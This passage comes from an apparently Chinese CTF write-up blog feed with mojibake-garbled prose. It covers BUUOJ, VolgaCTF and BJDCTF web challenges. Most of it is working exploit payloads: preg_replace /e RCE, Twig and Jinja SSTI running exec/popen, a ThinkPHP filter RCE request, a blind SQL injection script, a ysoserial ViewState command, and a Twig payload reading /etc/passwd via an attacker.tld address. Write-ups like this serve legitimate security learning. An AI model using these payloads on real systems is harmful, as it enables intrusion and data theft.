$_GET[&quot;file&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;I have a dream&quot;)){    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;    if(preg_match(&quot;/flag/&quot;,$file)){        die(&quot;Not now!&quot;);    }    include($file);  //next.php}else{    highlight_file(__FILE__);}?&gt;</code></pre><pre><code>http://e121170e-2c2b-419c-909f-05b530db4272.node3.buuoj.cn/?text=data://text/plain,I%20have%20a%20dream&amp;file=next.php</code></pre><p>next.php</p><pre><code class="php">&lt;?php$id = $_GET[&#39;id&#39;];$_SESSION[&#39;id&#39;] = $id;function complex($re, $str) {    return preg_replace(        &#39;/(&#39; . $re . &#39;)/ei&#39;,        &#39;strtolower(&quot;\\1&quot;)&#39;,        $str    );}foreach($_GET as $re =&gt; $str) {    echo complex($re, $str). &quot;\n&quot;;}function getFlag(){    @eval($_GET[&#39;cmd&#39;]);}</code></pre><pre><code>http://e121170e-2c2b-419c-909f-05b530db4272.node3.buuoj.cn/?&amp;\D*=${getFlag()}&amp;file=next.php&amp;text=data://,I%20have%20a%20dream&amp;cmd=system(%27cat%20/flag%27);</code></pre><h2 id="Cookie-is-so-stable"><a href="#Cookie-is-so-stable" class="headerlink" title="Cookie is so stable"></a>Cookie is so stable</h2><p>æ ¹æ®æç¤ºå‘ç°</p><pre><code>Cookie: PHPSESSID=30c6cb67d4e030c673ad2fa83c35cbc7; user=admin</code></pre><p>fuzzè¿‡ç¨‹ä¸­çŒœæµ‹æ˜¯ssti</p><p><img src="https://portswigger.net/cms/images/migration/blog/screen-shot-2015-07-20-at-09-21-56.png" alt="image4749"></p><p>æ£€æµ‹å‡ºæ˜¯twig</p><pre><code>Cookie: PHPSESSID=30c6cb67d4e030c673ad2fa83c35cbc7; user={{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}</code></pre><h2 id="EasySearch"><a href="#EasySearch" class="headerlink" title="EasySearch"></a>EasySearch</h2><p>åœ¨index.php.swpä¸­æ‰¾åˆ°æºç </p><pre><code class="php">&lt;?php    ob_start();    function get_hash(){        $chars = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#39;;        $random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times        $content = uniqid().$random;        return sha1($content);     }    header(&quot;Content-Type: text/html;charset=utf-8&quot;);    ***    if(isset($_POST[&#39;username&#39;]) and $_POST[&#39;username&#39;] != &#39;&#39; )    {        $admin = &#39;6d0bc1&#39;;        if ( $admin == substr(md5($_POST[&#39;password&#39;]),0,6)) {            echo &quot;&lt;script&gt;alert(&#39;[+] Welcome to manage system&#39;)&lt;/script&gt;&quot;;            $file_shtml = &quot;public/&quot;.get_hash().&quot;.shtml&quot;;            $shtml = fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);            $text = &#39;            ***            ***            &lt;h1&gt;Hello,&#39;.$_POST[&#39;username&#39;].&#39;&lt;/h1&gt;            ***            ***&#39;;            fwrite($shtml,$text);            fclose($shtml);            ***            echo &quot;[!] Header  error ...&quot;;        } else {            echo &quot;&lt;script&gt;alert(&#39;[!] Failed&#39;)&lt;/script&gt;&quot;;    }else    {    ***    }    ***?&gt;</code></pre><p>çˆ†ç ´å¾—åˆ°å¯†ç ,</p><p>å› ä¸ºå°†ç”¨æˆ·åæ’å…¥åˆ°äº†shtml,é€ æˆssi rce</p><p> <a href="https://github.com/vulhub/vulhub/tree/master/httpd/ssi-rce" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/httpd/ssi-rce</a> </p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2020/04/01/3æœˆåšé¢˜/">http://blog.ccreater.top/2020/04/01/3æœˆåšé¢˜/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> åšé¢˜ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>volgactf</title>
      <link href="/2020/03/30/volgactf/"/>
      <url>/2020/03/30/volgactf/</url>
      
        <content type="html"><![CDATA[<h1 id="volgactf"><a href="#volgactf" class="headerlink" title="volgactf"></a>volgactf</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Newsletter"><a href="#Newsletter" class="headerlink" title="Newsletter"></a>Newsletter</h3><p>æºç </p><pre><code class="php">&lt;?phpnamespace App\Controller;use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;use Symfony\Component\HttpFoundation\Response;use Symfony\Component\HttpFoundation\Request;use Symfony\Component\Mailer\MailerInterface;use Symfony\Component\Mime\Email;class MainController extends AbstractController{    public function index(Request $request)    {      return $this-&gt;render(&#39;main.twig&#39;);    }    public function subscribe(Request $request, MailerInterface $mailer)    {      $msg = &#39;&#39;;      $email = filter_var($request-&gt;request-&gt;get(&#39;email&#39;, &#39;&#39;), FILTER_VALIDATE_EMAIL);      if($email !== FALSE) {        $name = substr($email, 0, strpos($email, &#39;@&#39;));        $content = $this-&gt;get(&#39;twig&#39;)-&gt;createTemplate(          &quot;&lt;p&gt;Hello ${name}.&lt;/p&gt;&lt;p&gt;Thank you for subscribing to our newsletter.&lt;/p&gt;&lt;p&gt;Regards, VolgaCTF Team&lt;/p&gt;&quot;        )-&gt;render();###è¿™é‡Œ        $mail = (new Email())-&gt;from(&#39;newsletter@newsletter.q.2020.volgactf.ru&#39;)-&gt;to($email)-&gt;subject(&#39;VolgaCTF Newsletter&#39;)-&gt;html($content);        $mailer-&gt;send($mail);        $msg = &#39;Success&#39;;      } else {        $msg = &#39;Invalid email&#39;;      }      return $this-&gt;render(&#39;main.twig&#39;, [&#39;msg&#39; =&gt; $msg]);    }    public function source()    {        return new Response(&#39;&lt;pre&gt;&#39;.htmlspecialchars(file_get_contents(__FILE__)).&#39;&lt;/pre&gt;&#39;);    }}</code></pre><p>æˆ‘ä»¬å¾ˆå®¹æ˜“çŸ¥é“è¿™é‡Œå­˜åœ¨ssti,ä½†æ˜¯æœ‰ä¸¤ä¸ªé—®é¢˜:</p><ol><li>FILTER_VALIDATE_EMAILéªŒè¯</li><li>å¦‚ä½•æ¥æ”¶ç»“æœ</li></ol><p>ç¬¬äºŒä¸ªé—®é¢˜ä¸éš¾è§£å†³,ç›´æ¥ç”¨è‡ªå·±çš„vpsæ¥å—å°±å¯ä»¥,ç¬¬ä¸€ä¸ªé—®é¢˜é€šè¿‡æŸ¥è¯¢ç»´åŸºç™¾ç§‘ä¹Ÿå¯ä»¥æ„é€ å‡ºpayload,ä½†æ˜¯payloadå´æœ‰é•¿åº¦é™åˆ¶,æœ€å¤šåªèƒ½æœ‰64ä¸ªå­—ç¬¦,é€šå¸¸çš„twig sstiçš„payloadæ˜¯æ— æ³•ç›´æ¥ç”¨çš„äº†,éœ€è¦æˆ‘ä»¬è‡ªå·±æŒ–æ˜</p><p><a href="https://stackoverflow.com/questions/19220158/php-filter-validate-email-does-not-work-correctly" target="_blank" rel="noopener">https://stackoverflow.com/questions/19220158/php-filter-validate-email-does-not-work-correctly</a><br><a href="https://en.wikipedia.org/wiki/Email_address" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Email_address</a></p><p><code>python -m smtpd -n -c DebuggingServer 0.0.0.0:25</code></p><p>ä»¥ä¸‹æ˜¯æˆ‘æŒ–æ˜å‘ç°çš„payload,æœ€åè¿˜æ˜¯æ²¡èƒ½åšå‡ºæ¥,åŸå› æ˜¯è‡ªå·±æŸ¥è¯¢çš„ç‰ˆæœ¬å’Œé¢˜ç›®çš„ç‰ˆæœ¬ä¸ä¸€æ ·</p><pre><code class="php">&quot;{{app.request}}&quot;@ccreater.top&quot;{{app.environment}}&quot;%40ccreater.top  : prod&quot;{{app.request.request.get('name')}}&quot;@[47.107.171.219]email=&quot;{{render(controller(app.request.request.get('a')))}}&quot;@ccreater.top&amp;a=App\Controller\MainController::source&quot;{{render(controller(app.request.query.get(1),{'file':'flag'}))}}&quot;@ccreater.top 1=Symfony\Bundle\FrameworkBundle\Controller::fileæ–‡ä»¶åæœ€é•¿åªèƒ½4ä¸ª,å¹¶æ²¡æœ‰è¯»åˆ°flag</code></pre><p>ä»¥ä¸‹æ˜¯wpæä¾›çš„payload</p><p><a href="https://symfony.com/doc/current/reference/twig_reference.html#file-excerpt" target="_blank" rel="noopener">https://symfony.com/doc/current/reference/twig_reference.html#file-excerpt</a></p><pre><code>email=&quot;{{'/etc/passwd'|file_excerpt(1,30)}}&quot;@attacker.tldPOST /subscribe?0=cat+/etc/passwd HTTP/1.1Host: newsletter.q.2020.volgactf.ruContent-Type: application/x-www-form-urlencodedemail=&quot;{{app.request.query.filter(0,0,1024,{'options':'system'})}}&quot;@attacker.tld</code></pre><p><a href="https://twig.symfony.com/doc/3.x/functions/constant.html" target="_blank" rel="noopener">https://twig.symfony.com/doc/3.x/functions/constant.html</a><br>VolgaCTF_6751602deea2a308ab611eeef7a4e961<br><a href="https://blog.blackfan.ru/2020/03/volgactf-2020-qualifier-writeup.html?m=1" target="_blank" rel="noopener">https://blog.blackfan.ru/2020/03/volgactf-2020-qualifier-writeup.html?m=1</a></p><p>å…¶ä¸­æœ‰ä¸€ä¸ªfilter_varæ¥å‘½ä»¤æ‰§è¡Œå®åœ¨æ˜¯è®©æˆ‘æƒŠè®¶</p><h3 id="NetCorp"><a href="#NetCorp" class="headerlink" title="NetCorp"></a>NetCorp</h3><p>è¿™é¢˜æŒºç®€å•çš„,ä½†æ˜¯æˆ‘è¿˜æ˜¯æäº†å¥½ä¹…,å¯¹jspå’Œé¢˜ç›®çš„cveä¸€ç‚¹éƒ½ä¸ç†Ÿæ‚‰,æå¾—æˆ‘å†™ä¸ªpayloadéƒ½ç™¾åº¦åŠå¤©</p><p>ç«¯å£æ‰«æå‘ç°:</p><pre><code>8009/tcp open     ajp139090/tcp open     zeus-admin</code></pre><p>tomcat ajpå‰æ®µæ—¶é—´åˆšå¥½å‡ºäº†ä¸ªæ–‡ä»¶è¯»å–/åŒ…å«çš„æ¼æ´</p><p>è¯•äº†ä¸€ä¸‹,ç¡®å®å­˜åœ¨è¿™ä¸ªæ´</p><p>å…ˆè¯»å–/WEB-INF/web.xml</p><pre><code class="xml">&lt;!DOCTYPE web-app PUBLIC &quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot; &quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot; &gt;&lt;web-app&gt;  &lt;display-name&gt;NetCorp&lt;/display-name&gt;  &lt;servlet&gt;        &lt;servlet-name&gt;ServeScreenshot&lt;/servlet-name&gt;        &lt;display-name&gt;ServeScreenshot&lt;/display-name&gt;        &lt;servlet-class&gt;ru.volgactf.netcorp.ServeScreenshotServlet&lt;/servlet-class&gt;  &lt;/servlet&gt;  &lt;servlet-mapping&gt;        &lt;servlet-name&gt;ServeScreenshot&lt;/servlet-name&gt;        &lt;url-pattern&gt;/ServeScreenshot&lt;/url-pattern&gt;  &lt;/servlet-mapping&gt;        &lt;servlet&gt;                &lt;servlet-name&gt;ServeComplaint&lt;/servlet-name&gt;                &lt;display-name&gt;ServeComplaint&lt;/display-name&gt;                &lt;description&gt;Complaint info&lt;/description&gt;                &lt;servlet-class&gt;ru.volgactf.netcorp.ServeComplaintServlet&lt;/servlet-class&gt;        &lt;/servlet&gt;        &lt;servlet-mapping&gt;                &lt;servlet-name&gt;ServeComplaint&lt;/servlet-name&gt;                &lt;url-pattern&gt;/ServeComplaint&lt;/url-pattern&gt;        &lt;/servlet-mapping&gt;        &lt;error-page&gt;                &lt;error-code&gt;404&lt;/error-code&gt;                &lt;location&gt;/404.html&lt;/location&gt;        &lt;/error-page&gt;&lt;/web-app&gt;</code></pre><p>å†è¯»å–å…¶ä»–çš„classæ–‡ä»¶,å…¶ä¸­å‘ç°ä¸€ä¸ªä¸Šä¼ ç‚¹</p><pre><code class="java">package ru.volgactf.netcorp;import java.io.*;import java.math.BigInteger;import java.security.MessageDigest;import java.security.NoSuchAlgorithmException;import java.util.Collection;import java.util.Iterator;import javax.servlet.*;import javax.servlet.http.*;public class ServeScreenshotServlet extends HttpServlet{    public ServeScreenshotServlet()    {        System.out.println(&quot;ServeScreenshotServlet Constructor called!&quot;);    }    public void init(ServletConfig config)        throws ServletException    {        System.out.println(&quot;ServeScreenshotServlet \&quot;Init\&quot; method called&quot;);    }    public void destroy()    {        System.out.println(&quot;ServeScreenshotServlet \&quot;Destroy\&quot; method called&quot;);    }    protected void doPost(HttpServletRequest request, HttpServletResponse response)        throws ServletException, IOException    {        String appPath = request.getServletContext().getRealPath(&quot;&quot;);        String savePath = (new StringBuilder()).append(appPath).append(&quot;uploads&quot;).toString();        File fileSaveDir = new File(savePath);        if(!fileSaveDir.exists())            fileSaveDir.mkdir();        String submut = request.getParameter(&quot;submit&quot;);        if(submut != null)            if(submut.equals(&quot;true&quot;));        PrintWriter out = request.getParts().iterator();        do        {            if(!out.hasNext())                break;            Part part = (Part)out.next();            String fileName = extractFileName(part);            fileName = (new File(fileName)).getName();            String hashedFileName = generateFileName(fileName);            String path = (new StringBuilder()).append(savePath).append(File.separator).append(hashedFileName).toString();            if(!path.equals(&quot;Error&quot;))                part.write(path);        } while(true);        out = response.getWriter();        response.setContentType(&quot;application/json&quot;);        response.setCharacterEncoding(&quot;UTF-8&quot;);        out.print(String.format(&quot;{&#39;success&#39;:&#39;%s&#39;}&quot;, new Object[] {            &quot;true&quot;        }));        out.flush();    }    private String generateFileName(String fileName)    {        String s2;        StringBuilder sb;        MessageDigest md = MessageDigest.getInstance(&quot;MD5&quot;);        md.update(fileName.getBytes());        byte digest[] = md.digest();        s2 = (new BigInteger(1, digest)).toString(16);        sb = new StringBuilder(32);        int i = 0;        for(int count = 32 - s2.length(); i &lt; count; i++)            sb.append(&quot;0&quot;);        return sb.append(s2).toString();        NoSuchAlgorithmException e;        e;        e.printStackTrace();        return &quot;Error&quot;;    }    private String extractFileName(Part part)    {        String contentDisp = part.getHeader(&quot;content-disposition&quot;);        String items[] = contentDisp.split(&quot;;&quot;);        String as[] = items;        int i = as.length;        for(int j = 0; j &lt; i; j++)        {            String s = as[j];            if(s.trim().startsWith(&quot;filename&quot;))                return s.substring(s.indexOf(&quot;=&quot;) + 2, s.length() - 1);        }        return &quot;&quot;;    }    private static final String SAVE_DIR = &quot;uploads&quot;;}</code></pre><p>äºæ˜¯é—®é¢˜è§£å†³äº†</p><h3 id="Library"><a href="#Library" class="headerlink" title="Library"></a>Library</h3><p>è¿™é¢˜æœ‰ç‚¹æ„æ€,è®©æˆ‘æ¥è§¦äº†ä¸€ä¸ªæ–°çš„æŸ¥è¯¢è¯­è¨€ Graphql </p><p>å…ˆæ˜¯é€šè¿‡æŠ¥é”™è·çŸ¥äº†åç«¯æ˜¯nodejs,åˆé€šè¿‡æŠ¥é”™å¾—çŸ¥äº†apiæ˜¯Graphql </p><p>[PayloadsAllTheThings GraphQL]( <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL</a> Injection )</p><p>çœ‹äº†ä»–ä»¬çš„å®˜æ–¹æ–‡æ¡£,è‹±æ–‡çœ‹çš„å¤´éƒ½ç—›äº†,æ‰äº†è§£ä¸€äº›(å¹³å¸¸ç¿˜è‹±è¯­è¯¾çš„åæœ//)</p><p>æ ¹æ®ä»–ä»¬çš„ä¾‹å­æ‰¾åˆ°äº†ä¸€ä¸ªå¥‡æ€ªçš„query name</p><pre><code class="json">                     &quot;name&quot;: &quot;testGetUsersByFilter&quot;,                            &quot;description&quot;: &quot;&quot;,                            &quot;args&quot;: [                                {                                    &quot;name&quot;: &quot;filter&quot;,                                    &quot;description&quot;: &quot;&quot;,                                    &quot;type&quot;: {                                        &quot;kind&quot;: &quot;INPUT_OBJECT&quot;,                                        &quot;name&quot;: &quot;UserFilter&quot;,                                        &quot;ofType&quot;: null                                    },                                    &quot;defaultValue&quot;: null                                }                            ],                            &quot;type&quot;: {                                &quot;kind&quot;: &quot;LIST&quot;,                                &quot;name&quot;: null,                                &quot;ofType&quot;: {                                    &quot;kind&quot;: &quot;OBJECT&quot;,                                    &quot;name&quot;: &quot;User&quot;,                                    &quot;ofType&quot;: null                                }                            },                            &quot;isDeprecated&quot;: false,                            &quot;deprecationReason&quot;: null</code></pre><p>å¦¥å¦¥çš„è–„å¼±ç‚¹<br>æ„é€ </p><pre><code>query testGetUsersByFilter($input: UserFilter){    testGetUsersByFilter(filter:$input) {        name        login        email    }}{&quot;input&quot;:{&quot;login&quot;:&quot;\\&quot;,&quot;name&quot;:&quot; a&quot;,&quot;email&quot;:&quot;&quot;}}</code></pre><p>è¿”å›æç¤ºæ•°æ®åº“é”™è¯¯,sqlæ³¨å…¥get</p><h3 id="User-Center"><a href="#User-Center" class="headerlink" title="User Center"></a>User Center</h3><p> <a href="https://spotless.tech/volgactf-2020-qualifier-user-center.html" target="_blank" rel="noopener">https://spotless.tech/volgactf-2020-qualifier-user-center.html</a> </p><p>æ€»ç»“:ä¸åŒæµè§ˆå™¨è§£æhttpæŠ¥æ–‡çš„æ–¹å¼ä¸åŒ</p><p>å­åŸŸå¯ä»¥ä¿®æ”¹åŸŸçš„cookie</p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2020/03/30/volgactf/">http://blog.ccreater.top/2020/03/30/volgactf/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF</title>
      <link href="/2020/03/25/BJDCTF/"/>
      <url>/2020/03/25/BJDCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="BJDCTF"><a href="#BJDCTF" class="headerlink" title="BJDCTF"></a>BJDCTF</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="fake-google"><a href="#fake-google" class="headerlink" title="fake google"></a>fake google</h3><pre><code>{{%27%27.__class__.__mro__[1].__subclasses__()[-13].__init__.__globals__.__builtins__.eval(%27__import__("os").popen("find%20/%20-name%20*flag*").read()%27)}}</code></pre><h3 id="old-hack"><a href="#old-hack" class="headerlink" title="old_hack"></a>old_hack</h3><pre><code class="php">POST /?s=captcha HTTP/1.1Host: eb9ceebf-0bf5-4943-8580-9ccbf630568e.node3.buuoj.cnUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Connection: closeAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2DNT: 1Upgrade-Insecure-Requests: 1Cache-Control: max-age=0Content-Type: application/x-www-form-urlencodedContent-Length: 70_method=__construct&amp;filter%5B%5D=system&amp;method=get&amp;get%5B%5D=cat+/flag</code></pre><h3 id="duangShell"><a href="#duangShell" class="headerlink" title="duangShell"></a>duangShell</h3><pre><code class="php">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;give me a girl&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;center&gt;&lt;h1&gt;ççˆ±ç½‘&lt;/h1&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;&lt;?phperror_reporting(0);echo &quot;how can i give you source code? .swp?!&quot;.&quot;&lt;br&gt;&quot;;if (!isset($_POST[&#39;girl_friend&#39;])) {    die(&quot;where is P3rh4ps&#39;s girl friend ???&quot;);} else {    $girl = $_POST[&#39;girl_friend&#39;];    if (preg_match(&#39;/\&gt;|\\\/&#39;, $girl)) {        die(&#39;just girl&#39;);    } else if (preg_match(&#39;/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i&#39;, $girl)) {        echo &quot;&lt;img src=&#39;img/p3_need_beautiful_gf.png&#39;&gt; &lt;!-- He is p3 --&gt;&quot;;    } else {        //duangShell~~~~        exec($girl);    }}</code></pre><h3 id="ç®€å•æ³¨å…¥"><a href="#ç®€å•æ³¨å…¥" class="headerlink" title="ç®€å•æ³¨å…¥"></a>ç®€å•æ³¨å…¥</h3><pre><code class="python">username=a\&amp;password=/if(1,sleep(5),1)%23username=a\&amp;password=/if(select/**/substr(group_concat(database()),1,1),sleep(5),1)%23username=a\&amp;password=/if(substr(hex(password),1,1)&lt;5,sleep(5),1)%23</code></pre><p>è¿‡æ»¤:<code>=,&#39;,;</code></p><pre><code class="python">import requestsimport timeburp0_url = &quot;http://f9dc5389-32c2-48b6-a208-cd32482ef972.node3.buuoj.cn:80/index.php&quot;burp0_cookies = {&quot;_ga&quot;: &quot;GA1.2.212283867.1584191400&quot;, &quot;_gid&quot;: &quot;GA1.2.1374622556.1584775121&quot;}burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&quot;, &quot;Origin&quot;: &quot;http://f9dc5389-32c2-48b6-a208-cd32482ef972.node3.buuoj.cn&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://f9dc5389-32c2-48b6-a208-cd32482ef972.node3.buuoj.cn/index.php&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}burp0_data = {&quot;username&quot;: &quot;a\\&quot;, &quot;password&quot;: &quot;/if(substr(hex(password),1,1)&lt;5,sleep(6),1)#&quot;}count=0result=&quot;&quot;while True:    count+=1    for i in &quot;123456789ABCDEFG&quot;:        burp0_data = {&quot;username&quot;: &quot;a\\&quot;, &quot;password&quot;: &quot;/if(substr(hex(password),POS,1)&lt;GUESS,sleep(5),1)#&quot;.replace(&quot;POS&quot;,str(count)).replace(&quot;GUESS&quot;,hex(ord(i)))}        print(burp0_data[&#39;password&#39;])        try:            requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,timeout=5)            time.sleep(0.5)        except:            result+=chr(ord(i)-1)            print(result)            breakprint(result)#4F68794F75464F754E646974#OhyOuFOuNditrequests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)</code></pre><h3 id="SchroÌˆdinger"><a href="#SchroÌˆdinger" class="headerlink" title="SchroÌˆdinger"></a>SchroÌˆdinger</h3><p>æ›´æ”¹cookieæ‹¿åˆ°å¯†ç </p><p>av11664517@1583985203.</p><p> <a href="https://www.bilibili.com/video/av11664517" target="_blank" rel="noopener">https://www.bilibili.com/video/av11664517</a> </p><p> BJD{Quantum_Mechanics_really_Ez} </p><h3 id="asp"><a href="#asp" class="headerlink" title="asp"></a>asp</h3><p> <a href="https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell/" target="_blank" rel="noopener">https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell/</a> </p><pre><code>http://ff9359c1-85b4-4f2a-a1ad-31c1e40f186d.node3.buuoj.cn//ImgLoad.aspx?path=5.gif</code></pre><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;configuration&gt;&lt;system.web&gt;&lt;machineKey validationKey=&quot;47A7D23AF52BEF07FB9EE7BD395CD9E19937682ECB288913CE758DE5035CF40DC4DB2B08479BF630CFEAF0BDFEE7242FC54D89745F7AF77790A4B5855A08EAC9&quot; decryptionKey=&quot;B0E528C949E59127E7469C9AF0764506BAFD2AB8150A75A5&quot; validation=&quot;SHA1&quot; decryption=&quot;3DES&quot; /&gt;&lt;/system.web&gt;&lt;/configuration&gt;</code></pre><p>validationKeyæ³„éœ²,åˆ©ç”¨viewstatasæ¥ä»»æ„å‘½ä»¤æ‰§è¡Œ</p><pre><code>ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile  -c &quot;ExploitClass.cs;./dlls/System.dll;./dlls/System.Web.dll&quot;  --generator=&quot;CA0B0334&quot;  --validationalg=&quot;SHA1&quot;  --validationkey=&quot;47A7D23AF52BEF07FB9EE7BD395CD9E19937682ECB288913CE758DE5035CF40DC4DB2B08479BF630CFEAF0BDFEE7242FC54D89745F7AF77790A4B5855A08EAC9&quot;</code></pre><h3 id="å¥—çŒª"><a href="#å¥—çŒª" class="headerlink" title="å¥—çŒª"></a>å¥—çŒª</h3><p>ç™»é™†åæ‰¾åˆ°ä¸€ä¸ªæç¤º</p><p> L0g1n.php</p><p>ç»è¿‡è¾“å…¥ä¸€ç³»åˆ—httpå¤´åæ‹¿åˆ°flag</p><pre><code>GET /L0g1n.php HTTP/1.1Host: node3.buuoj.cn:25341Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Contiki/1.1-rc1 (Commodore 64; http://dunkels.com/adam/contiki/)From: root@gem-love.comReferer: gem-love.comClient-Ip: 127.0.0.1Via: y1ng.vipAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Cookie: PHPSESSID=gppova7f172e56f11qlrffpb64; time=4740514103Connection: close</code></pre><h3 id="elementmaster"><a href="#elementmaster" class="headerlink" title="elementmaster"></a>elementmaster</h3><pre><code class="python">import requestsimport timearr=[&quot;H&quot;, &quot;He&quot;, &quot;Li&quot;, &quot;Be&quot;, &quot;B&quot;, &quot;C&quot;, &quot;N&quot;, &quot;O&quot;, &quot;F&quot;, &quot;Ne&quot;, &quot;Na&quot;, &quot;Mg&quot;, &quot;Al&quot;, &quot;Si&quot;, &quot;P&quot;, &quot;S&quot;, &quot;Cl&quot;, &quot;Ar&quot;, &quot;K&quot;, &quot;Ca&quot;, &quot;Sc&quot;, &quot;Ti&quot;, &quot;V&quot;, &quot;Cr&quot;, &quot;Mn&quot;, &quot;Fe&quot;, &quot;Co&quot;, &quot;Ni&quot;, &quot;Cu&quot;, &quot;Zn&quot;, &quot;Ga&quot;, &quot;Ge&quot;, &quot;As&quot;, &quot;Se&quot;, &quot;Br&quot;, &quot;Kr&quot;, &quot;Rb&quot;, &quot;Sr&quot;, &quot;Y&quot;, &quot;Zr&quot;, &quot;Nb&quot;, &quot;Mo&quot;, &quot;Te&quot;, &quot;Ru&quot;, &quot;Rh&quot;, &quot;Pd&quot;, &quot;Ag&quot;, &quot;Cd&quot;, &quot;In&quot;, &quot;Sn&quot;, &quot;Sb&quot;, &quot;Te&quot;, &quot;I&quot;, &quot;Xe&quot;, &quot;Cs&quot;, &quot;Ba&quot;, &quot;La&quot;, &quot;Ce&quot;, &quot;Pr&quot;, &quot;Nd&quot;, &quot;Pm&quot;, &quot;Sm&quot;, &quot;Eu&quot;, &quot;Gd&quot;, &quot;Tb&quot;, &quot;Dy&quot;, &quot;Ho&quot;, &quot;Er&quot;, &quot;Tm&quot;, &quot;Yb&quot;, &quot;Lu&quot;, &quot;Hf&quot;, &quot;Ta&quot;, &quot;W&quot;, &quot;Re&quot;, &quot;Os&quot;, &quot;Ir&quot;, &quot;Pt&quot;, &quot;Au&quot;, &quot;Hg&quot;, &quot;Tl&quot;, &quot;Pb&quot;, &quot;Bi&quot;, &quot;Po&quot;, &quot;At&quot;, &quot;Rn&quot;, &quot;Fr&quot;, &quot;Ra&quot;, &quot;Ac&quot;, &quot;Th&quot;, &quot;Pa&quot;, &quot;U&quot;, &quot;Np&quot;, &quot;Pu&quot;, &quot;Am&quot;, &quot;Cm&quot;, &quot;Bk&quot;, &quot;Cf&quot;, &quot;Es&quot;, &quot;Fm&quot;,&quot;Md&quot;,&quot;No&quot;,&quot;Lr&quot;,&quot;Ku&quot;,&quot;Ha&quot;]url=&quot;http://aca57d0d-cd67-498b-a8ea-09588ab05db6.node3.buuoj.cn/&quot;for i in arr:    r=requests.get(url+i+&quot;.php&quot;)    if r.status_code==200:        print(r.text,end=&quot;&quot;)    time.sleep(0.5)</code></pre><p><code>And_th3_3LemEnt5_w1LL_De5tR0y_y0u.php</code></p><h3 id="xss"><a href="#xss" class="headerlink" 